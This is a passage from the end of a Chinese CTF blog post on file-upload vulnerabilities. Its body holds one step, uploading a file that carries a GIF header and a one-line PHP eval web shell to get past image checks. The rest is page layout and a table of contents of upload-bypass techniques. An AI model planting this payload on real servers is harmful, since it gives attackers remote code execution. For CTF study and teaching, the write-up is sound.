<li><p>  然后上传1.txt，payload如下</p>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">GIF89a
&lt;?&#x3D;eval($_POST[&#39;1&#39;])?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io">h3110w0r1d</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">http://dezhoutorizhao.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://dezhoutorizhao.github.io" target="_blank">h3110w0r1d's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/ing/">ing</a></div><div class="post-share"><div class="social-share" data-image="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="prev-post pull-left" href="/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="小迪老师代码审计"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">小迪老师代码审计</div></div></a><a class="next-post pull-right" href="/php%E8%AF%AD%E6%B3%95/" title="php基本语法复习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php基本语法复习</div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">h3110w0r1d</div><div class="author-info-description">曲师大DebuGGer战队成员，喜欢科研，希望未来可以做一个科研家</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看他学了什么新技术吧</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">经典绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">什么是文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">查找文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.4.</span> <span class="toc-text">利用类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E7%B1%BB"><span class="toc-number">1.4.1.</span> <span class="toc-text">常规类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E8%8E%B7%E5%8F%96%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">扫描获取上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">会员中心上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">后台系统上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E9%80%94%E5%BE%84%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">各种途径上传</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS%E7%B1%BB"><span class="toc-number">1.4.2.</span> <span class="toc-text">CMS类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%BE%91%E5%99%A8%E7%B1%BB"><span class="toc-number">1.4.3.</span> <span class="toc-text">编辑器类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B1%BB-CVE"><span class="toc-number">1.4.4.</span> <span class="toc-text">其他类&#x2F;CVE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E5%90%8E%E9%97%A8%E6%B5%8B%E8%AF%953938"><span class="toc-number">1.4.5.</span> <span class="toc-text">配合解析漏洞下的文件类型后门测试3938</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.4.6.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Content-type"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">Content-type</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%E9%A9%AC"><span class="toc-number">1.5.</span> <span class="toc-text">最常用的马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.</span> <span class="toc-text">常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system"><span class="toc-number">1.6.1.</span> <span class="toc-text">system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval"><span class="toc-number">1.6.2.</span> <span class="toc-text">eval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tac-cat"><span class="toc-number">1.6.3.</span> <span class="toc-text">tac&#x2F;cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.6.4.</span> <span class="toc-text">@</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#array-pop"><span class="toc-number">1.6.5.</span> <span class="toc-text">array_pop()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="toc-number">1.7.</span> <span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E5%89%8D%E7%AB%AF%E8%BF%87%E6%BB%A4%EF%BC%8Cctfshow"><span class="toc-number">1.7.1.</span> <span class="toc-text">js前端过滤，ctfshow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB"><span class="toc-number">1.7.2.</span> <span class="toc-text">文件后缀绕过攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB-%E5%90%8E%E7%AB%AF%E4%B8%8D%E8%83%BD%E5%8D%95%E4%B8%80%E6%A0%A1%E9%AA%8C"><span class="toc-number">1.7.3.</span> <span class="toc-text">文件类型绕过攻击,后端不能单一校验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-FLIES-%E2%80%9Cfile%E2%80%9D-%E2%80%9Ctype%E2%80%9D-%E5%90%8E%E7%AB%AF%E8%BF%87%E6%BB%A4"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">使用$_FLIES[“file”][“type”]后端过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E7%94%A8%E8%9A%81%E5%89%91%E5%8E%BB%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.7.3.1.1.</span> <span class="toc-text">方法2：用蚁剑去连接</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8getimagesize-%E5%90%8E%E7%AB%AF%E8%BF%87%E6%BB%A4"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">使用getimagesize()后端过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">1.7.3.3.</span> <span class="toc-text">黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#user-ini%E6%96%87%E4%BB%B6-%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-number">1.7.3.3.1.</span> <span class="toc-text">.user.ini文件,常用配置项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E8%BF%87%E6%BB%A4"><span class="toc-number">1.7.4.</span> <span class="toc-text">对文件内容过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.4.1.</span> <span class="toc-text">常用绕过方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8php%E5%AD%97%E6%A0%B7%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87%EF%BC%8C%E4%BE%8B%E9%A2%98%EF%BC%9Actfshow154-ctfshow155"><span class="toc-number">1.7.4.2.</span> <span class="toc-text">不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%8B%AC%E5%8F%B7-%EF%BC%8Cctfshow156"><span class="toc-number">1.7.4.3.</span> <span class="toc-text">不允许使用中括号[]，ctfshow156</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E8%BF%98%E8%BF%87%E6%BB%A4%E4%BA%86%E5%88%86%E5%8F%B7%EF%BC%8Cctfshow157"><span class="toc-number">1.7.4.4.</span> <span class="toc-text">中括号和大括号都过滤了，还过滤了分号，ctfshow157</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web159%EF%BC%8C%E5%AF%B9%E5%A4%A7%E5%B0%8F%E6%8B%AC%E5%8F%B7%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4-%E5%AF%B9%E7%89%B9%E6%AE%8A%E8%B7%AF%E5%BE%84%E5%AD%97%E7%AC%A6%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4"><span class="toc-number">1.7.5.</span> <span class="toc-text">web159，对大小括号进行过滤,对特殊路径字符进行过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%A4%8D%E6%94%B9%E5%8C%85%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="toc-number">1.7.6.</span> <span class="toc-text">重复改包的技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web160"><span class="toc-number">1.7.7.</span> <span class="toc-text">web160</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.7.7.1.</span> <span class="toc-text">使用文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98"><span class="toc-number">1.7.7.2.</span> <span class="toc-text">题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8getimagesize-%E5%AF%B9%E6%96%87%E4%BB%B6%E5%A4%B4%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B"><span class="toc-number">1.7.8.</span> <span class="toc-text">使用getimagesize()对文件头进行检测</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E7%AB%AF%E5%88%B0%E7%AB%AF%E7%9A%84%E6%99%BA%E8%83%BD%E9%97%AE%E7%AD%94%E7%B3%BB%E7%BB%9F/" title="端到端的智能问答系统">端到端的智能问答系统</a><time datetime="2024-10-01T16:00:00.000Z" title="发表于 2024-10-02 00:00:00">2024-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/LLM%E5%AE%89%E5%85%A8/" title="LLM安全专题">LLM安全专题</a><time datetime="2024-09-10T16:00:00.000Z" title="发表于 2024-09-11 00:00:00">2024-09-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%96%87%E6%A1%A3%E8%A7%A3%E8%AF%BB/" title="OpenAI 文档解读">OpenAI 文档解读</a><time datetime="2024-09-09T16:00:00.000Z" title="发表于 2024-09-10 00:00:00">2024-09-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/LLMOops/" title="LLMOops">LLMOops</a><time datetime="2024-09-06T16:00:00.000Z" title="发表于 2024-09-07 00:00:00">2024-09-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Zeek%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="五元组流的流级别特征提取、报文级时间序列特征提取">五元组流的流级别特征提取、报文级时间序列特征提取</a><time datetime="2024-08-02T03:17:48.294Z" title="发表于 2024-08-02 11:17:48">2024-08-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">成功的秘诀在于兴趣</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.0.0"></script><script src="/js/main.js?v=5.0.0"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>